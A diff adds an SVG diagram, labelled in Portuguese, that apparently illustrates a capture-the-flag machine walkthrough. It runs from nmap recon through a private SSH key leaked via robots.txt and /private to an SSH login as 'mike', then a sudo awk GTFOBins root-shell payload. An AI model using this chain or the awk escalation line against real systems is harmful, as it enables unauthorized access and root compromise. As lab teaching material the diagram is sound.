@@ -1,0 +1,76 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 980 430" role="img" aria-labelledby="t d">
+  <title id="t">A cadeia da máquina: recon, foothold e escalação, ponta a ponta</title>
+  <desc id="d">Três estágios da esquerda para a direita. Estágio 1, RECON: um nmap nas portas publicadas revela duas portas, 2222 com SSH e 8080 com um servidor web nginx. Estágio 2, FOOTHOLD: no servidor web, o arquivo robots.txt entrega o caminho /private; ali está uma chave SSH privada (id_ed25519) deixada por engano no diretório servido pela web; com a chave baixada e permissão 600, um ssh entra como o usuário mike, que lê a primeira flag, user.txt. Estágio 3, ESCALAÇÃO: como mike, o comando sudo -l mostra que ele pode rodar o awk como root sem senha (NOPASSWD); o truque do GTFOBins sudo awk BEGIN system bin sh abre um shell de root, uid igual a zero, que lê a segunda flag, root.txt. Cada estágio alimenta o próximo: o recon acha a web, a web vaza a chave, a chave dá o usuário, o usuário vira root.</desc>
+  <style>
+    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
+    .t { font-size: 16px; font-weight: 700; }
+    .stage { font-size: 13px; font-weight: 700; fill: #5cc8d8; letter-spacing: 1px; }
+    .box { fill: #0f1b20; stroke: #5cc8d8; stroke-width: 2; }
+    .cmd { font-size: 11.5px; fill: #e6ede8; font-weight: 700; }
+    .n { font-size: 10px; fill: #cfe0d6; }
+    .flow { stroke: #9fb0a6; stroke-width: 2.5; fill: none; marker-end: url(#ac); }
+    .flag { fill: #16201b; stroke: #5ee08a; stroke-width: 2; }
+    .ft { font-size: 11px; font-weight: 700; fill: #5ee08a; }
+    .lane { fill: none; stroke: #2a3a33; stroke-width: 1.5; stroke-dasharray: 4 4; }
+  </style>
+  <defs>
+    <marker id="ac" markerWidth="10" markerHeight="10" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#9fb0a6"/></marker>
+  </defs>
+  <rect width="980" height="430" fill="#121815"/>
+  <text class="t" x="30" y="34">A cadeia da máquina — do nmap à flag de root, um passo puxa o outro</text>
+
+  <!-- lane separators -->
+  <line class="lane" x1="330" y1="70" x2="330" y2="400"/>
+  <line class="lane" x1="660" y1="70" x2="660" y2="400"/>
+  <text class="stage" x="40" y="90">1 · RECON</text>
+  <text class="stage" x="360" y="90">2 · FOOTHOLD</text>
+  <text class="stage" x="690" y="90">3 · ESCALAÇÃO</text>
+
+  <!-- stage 1 -->
+  <rect class="box" x="40" y="110" width="260" height="56" rx="8"/>
+  <text class="cmd" x="56" y="134">nmap -sV -p 2222,8080</text>
+  <text class="n" x="56" y="152">varre as portas publicadas</text>
+  <rect class="box" x="40" y="200" width="260" height="70" rx="8"/>
+  <text class="n" x="56" y="224">2222/tcp  ssh   OpenSSH</text>
+  <text class="n" x="56" y="242">8080/tcp  http  nginx</text>
+  <text class="n" x="56" y="260">dois serviços expostos</text>
+
+  <!-- stage 2 -->
+  <rect class="box" x="370" y="110" width="270" height="56" rx="8"/>
+  <text class="cmd" x="386" y="134">GET /robots.txt</text>
+  <text class="n" x="386" y="152">entrega o caminho /private/</text>
+  <rect class="box" x="370" y="200" width="270" height="56" rx="8"/>
+  <text class="cmd" x="386" y="224">/private/id_ed25519</text>
+  <text class="n" x="386" y="242">chave SSH privada vazada</text>
+  <rect class="box" x="370" y="290" width="270" height="56" rx="8"/>
+  <text class="cmd" x="386" y="314">ssh -i chave mike@alvo</text>
+  <text class="n" x="386" y="332">chmod 600 → entra como mike</text>
+  <rect class="flag" x="370" y="368" width="270" height="34" rx="8"/>
+  <text class="ft" x="505" y="390" text-anchor="middle">★ user.txt (flag 1)</text>
+
+  <!-- stage 3 -->
+  <rect class="box" x="700" y="110" width="250" height="56" rx="8"/>
+  <text class="cmd" x="716" y="134">sudo -l</text>
+  <text class="n" x="716" y="152">(root) NOPASSWD: /usr/bin/awk</text>
+  <rect class="box" x="700" y="200" width="250" height="70" rx="8"/>
+  <text class="cmd" x="716" y="224">sudo awk 'BEGIN{</text>
+  <text class="cmd" x="716" y="242">  system("/bin/sh")}'</text>
+  <text class="n" x="716" y="260">GTFOBins → shell de root</text>
+  <rect class="box" x="700" y="290" width="250" height="56" rx="8"/>
+  <text class="cmd" x="716" y="314"># id → uid=0(root)</text>
+  <text class="n" x="716" y="332">controle total do host</text>
+  <rect class="flag" x="700" y="368" width="250" height="34" rx="8"/>
+  <text class="ft" x="825" y="390" text-anchor="middle">★ root.txt (flag 2)</text>
+
+  <!-- vertical flow inside stages -->
+  <path class="flow" d="M170,166 L170,196"/>
+  <path class="flow" d="M505,166 L505,196"/>
+  <path class="flow" d="M505,256 L505,286"/>
+  <path class="flow" d="M505,346 L505,364"/>
+  <path class="flow" d="M825,166 L825,196"/>
+  <path class="flow" d="M825,270 L825,286"/>
+  <path class="flow" d="M825,346 L825,364"/>
+  <!-- cross-stage flow -->
+  <path class="flow" d="M300,235 L366,138"/>
+  <path class="flow" d="M640,320 L696,138"/>
+</svg>
